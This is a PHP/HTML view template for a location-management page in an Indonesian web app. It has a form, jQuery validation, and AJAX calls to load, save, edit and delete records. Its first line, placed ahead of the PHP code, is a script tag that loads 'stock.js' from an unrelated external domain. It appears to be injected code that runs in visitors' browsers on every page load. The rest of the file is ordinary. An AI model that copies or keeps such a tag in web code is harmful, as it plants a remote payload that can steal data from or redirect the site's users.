<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->lokasi;?>
<form class="form_input mb-3" id="form_input">
    <input type="hidden" name="id" id="id">
    <input type="hidden" name="param" id="param" value="add">
    <input type="hidden" name="alamat" id="alamat">
    <input type="hidden" name="longitude" id="longitude">
    <input type="hidden" name="latitude" id="latitude">
    <div class="card">
        <div class="card-body">
            <div class="row">
                <div class="col-md-12">
                    <div class="row">
                        <div class="col-md-5"><?php inputForm(["label"=>$this->nama]);?></div>
                        <div class="col-md-6"><?php inputForm(["label"=>"pac-input","name"=>"Lokasi"]);?></div>
                        <div class="col-md-1" style="margin-top: 7px">
                            <label for="nameBackdrop" class="form-label"></label>
                            <button type="submit" class="btn btn-primary btn-save" style="float: right;"><i class='bx bx-send'></i></button>
                            <button class="btn btn-primary btn-loading" type="button" disabled  style="float: right;display: none">
                                <span class="spinner-border" role="status" aria-hidden="true"></span>
                            </button>
                        </div>
                        <div class="col-md-12">
                            <p style="margin-top: 10px"><small id="txtAlamat"></small></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</form>
<div class="row" id="result-sub"></div>

<script>
    var urlLocal    = `${strLokasi}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;
    pageActiveName = pages;
    $(document).ready(function() {
        loadData("1");
    });
    function loadData(page="1",isCache=true){
        no=page;
        var where=page;
        var url=base_url+urlLocal+urlRead;
        console.log("url",url+where)
        console.log("is cache",isCache)
        if(!isCache) {
            localCache.remove(url+where);
        }
        urlActive = urlLocal+urlRead+where;
        ajaxView(urlLocal+urlRead+where,null,function(res){
            attrId("result-sub").html(res);
        });
    }

    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,true);})
        }
    }
    formInput.validate({
        rules: {
            nama: {required: true,remote: {url: `${strLokasi}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}},
            "pac-input":{required:paramForm.val()==="add"}
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            var formData=new FormData(formInput[0]);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(attrId(strNama).val(),"",paramForm.val(),function(page,searchName){
                        loadData(`1`,false);
                        attrId("txtAlamat").text("");
                        delForm(formInput);
                        paramForm.val(strAdd);
                        notif(strSuccess);
                    })
                } else {
                    notif(strFailed);
                }
            })

        }
    });

    function hapus(id) {
        swal({
            title: "Anda yakin akan hapus data ini?",
            text: "Data yang dihapus tidak bisa dikembalikan lagi",
            type: "warning",
            showCancelButton: true,
            confirmButtonColor: "#696cff",
            cancelButtonColor: "#d33",
            confirmButtonText: "Ya !",
            cancelButtonText: "Tidak !",
            closeOnConfirm: false
        }).then(function (isConfirm) {
            if (isConfirm) {
                ajaxData(base_url+urlLocal+urlDelete, { id: id }, function (res) {
                    swal.close();
                    if (res.status) {
                        loadData("1",false);
                        notif("hapus");
                    } else {
                        notif("error");
                    }
                },false);
            }
        });
    }

    function ubah(id) {
        attrId("pac-input").rules('remove', 'required');
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                var data=res.res_data;
                setFocus("pac-input");
                var dataSet = [strId,strNama,"alamat","longitude","latitude"];
                dataSet.forEach(function(row){setIdSelect(row,data[row]);});
                attrId("txtAlamat").text(data["alamat"]);
                setIdSelect("pac-input","");
            } else {
                notif(strFailed);
            }
        });
    }
    modalForm.on(strHideModal, function () {
        delForm(formInput);
        delImage();
    });

</script>